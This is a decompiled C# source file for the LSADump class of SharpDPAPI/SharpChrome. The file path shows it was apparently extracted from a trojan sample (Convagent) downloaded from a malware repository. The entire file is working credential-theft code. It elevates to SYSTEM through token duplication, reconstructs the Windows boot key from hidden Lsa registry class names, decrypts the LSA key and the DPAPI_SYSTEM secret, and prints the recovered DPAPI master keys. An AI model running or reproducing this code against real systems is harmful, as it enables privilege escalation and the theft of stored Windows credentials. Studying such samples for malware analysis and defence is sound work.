// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.LSADump
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SharpDPAPI
{
  public class LSADump
  {
    public static List<byte[]> GetDPAPIKeys(bool show = false)
    {
      List<byte[]> dpapiKeys = new List<byte[]>();
      byte[] lsaSecret = LSADump.GetLSASecret("DPAPI_SYSTEM");
      byte[] destinationArray1 = new byte[20];
      byte[] destinationArray2 = new byte[20];
      Array.Copy((Array) lsaSecret, 0, (Array) destinationArray1, 0, 20);
      Array.Copy((Array) lsaSecret, 20, (Array) destinationArray2, 0, 20);
      dpapiKeys.Add(destinationArray1);
      dpapiKeys.Add(destinationArray2);
      if (!show)
        return dpapiKeys;
      Console.WriteLine("[*] Secret  : DPAPI_SYSTEM");
      Console.WriteLine("[*]    full: {0}", (object) BitConverter.ToString(lsaSecret).Replace("-", ""));
      Console.WriteLine("[*]    m/u : {0} / {1}\r\n", (object) BitConverter.ToString(destinationArray1).Replace("-", ""), (object) BitConverter.ToString(destinationArray2).Replace("-", ""));
      return dpapiKeys;
    }

    public static byte[] GetLSASecret(string secretName)
    {
      bool flag = false;
      if (!Helpers.IsHighIntegrity())
      {
        Console.WriteLine("[X] You need to be in high integrity to extract LSA secrets!");
        return (byte[]) null;
      }
      if (WindowsIdentity.GetCurrent().Name == "NT AUTHORITY\\SYSTEM")
      {
        flag = true;
      }
      else
      {
        Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
        Helpers.GetSystem();
      }
      byte[] lsaKey = LSADump.GetLSAKey();
      byte[] regKeyValue = Helpers.GetRegKeyValue(string.Format("SECURITY\\Policy\\Secrets\\{0}\\CurrVal", (object) secretName));
      byte[] numArray1 = new byte[regKeyValue.Length - 28];
      Array.Copy((Array) regKeyValue, 28, (Array) numArray1, 0, numArray1.Length);
      byte[] destinationArray1 = new byte[32];
      Array.Copy((Array) numArray1, 0, (Array) destinationArray1, 0, 32);
      byte[] rawData = destinationArray1;
      byte[] key = Crypto.LSASHA256Hash(lsaKey, rawData);
      byte[] destinationArray2 = new byte[numArray1.Length - 32];
      Array.Copy((Array) numArray1, 32, (Array) destinationArray2, 0, destinationArray2.Length);
      byte[] numArray2 = new byte[16];
      byte[] data = destinationArray2;
      byte[] sourceArray = Crypto.LSAAESDecrypt(key, data);
      if (!flag)
      {
        Console.WriteLine("[*] RevertToSelf()\r\n");
        Interop.RevertToSelf();
      }
      if (secretName.Equals("DPAPI_SYSTEM"))
      {
        byte[] destinationArray3 = new byte[40];
        Array.Copy((Array) sourceArray, 20, (Array) destinationArray3, 0, 40);
        return destinationArray3;
      }
      Console.WriteLine("[X] LSA Secret '{0}' not yet implemented!", (object) secretName);
      return (byte[]) null;
    }

    public static byte[] GetLSAKey()
    {
      byte[] bootKey = LSADump.GetBootKey();
      byte[] regKeyValue = Helpers.GetRegKeyValue("SECURITY\\Policy\\PolEKList");
      byte[] numArray1 = new byte[regKeyValue.Length - 28];
      Array.Copy((Array) regKeyValue, 28, (Array) numArray1, 0, numArray1.Length);
      byte[] destinationArray1 = new byte[32];
      Array.Copy((Array) numArray1, 0, (Array) destinationArray1, 0, 32);
      byte[] rawData = destinationArray1;
      byte[] key = Crypto.LSASHA256Hash(bootKey, rawData);
      byte[] destinationArray2 = new byte[numArray1.Length - 32];
      Array.Copy((Array) numArray1, 32, (Array) destinationArray2, 0, destinationArray2.Length);
      byte[] numArray2 = new byte[16];
      byte[] data = destinationArray2;
      byte[] sourceArray = Crypto.LSAAESDecrypt(key, data);
      byte[] lsaKey = new byte[32];
      byte[] destinationArray3 = lsaKey;
      Array.Copy((Array) sourceArray, 68, (Array) destinationArray3, 0, 32);
      return lsaKey;
    }

    public static byte[] GetBootKey()
    {
      StringBuilder stringBuilder = new StringBuilder();
      string[] strArray = new string[4]
      {
        "JD",
        "Skew1",
        "GBG",
        "Data"
      };
      foreach (object obj in strArray)
      {
        string subKey = string.Format("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{0}", obj);
        StringBuilder lpClass = new StringBuilder(1024);
        int lpcbClass = 1024;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        if (Interop.RegOpenKeyEx(2147483650U, subKey, 0, 25, ref zero1) != 0)
        {
          int lastWin32Error = Marshal.GetLastWin32Error();
          string message = new Win32Exception(lastWin32Error).Message;
          Console.WriteLine("Error opening {0} ({1}) : {2}", (object) subKey, (object) lastWin32Error, (object) message);
          return (byte[]) null;
        }
        if (Interop.RegQueryInfoKey(zero1, lpClass, ref lpcbClass, 0, ref zero2, ref zero2, ref zero2, ref zero2, ref zero2, ref zero2, ref zero2, IntPtr.Zero) != 0)
        {
          int lastWin32Error = Marshal.GetLastWin32Error();
          string message = new Win32Exception(lastWin32Error).Message;
          Console.WriteLine("Error enumerating {0} ({1}) : {2}", (object) subKey, (object) lastWin32Error, (object) message);
          return (byte[]) null;
        }
        Interop.RegCloseKey(zero1);
        stringBuilder.Append((object) lpClass);
      }
      byte[] byteArray = Helpers.StringToByteArray(stringBuilder.ToString());
      byte[] numArray = new byte[16]
      {
        (byte) 8,
        (byte) 5,
        (byte) 4,
        (byte) 2,
        (byte) 11,
        (byte) 9,
        (byte) 13,
        (byte) 3,
        (byte) 0,
        (byte) 6,
        (byte) 1,
        (byte) 12,
        (byte) 14,
        (byte) 10,
        (byte) 15,
        (byte) 7
      };
      byte[] bootKey = new byte[16];
      for (int index = 0; index < bootKey.Length; ++index)
        bootKey[index] = byteArray[(int) numArray[index]];
      return bootKey;
    }
  }
}
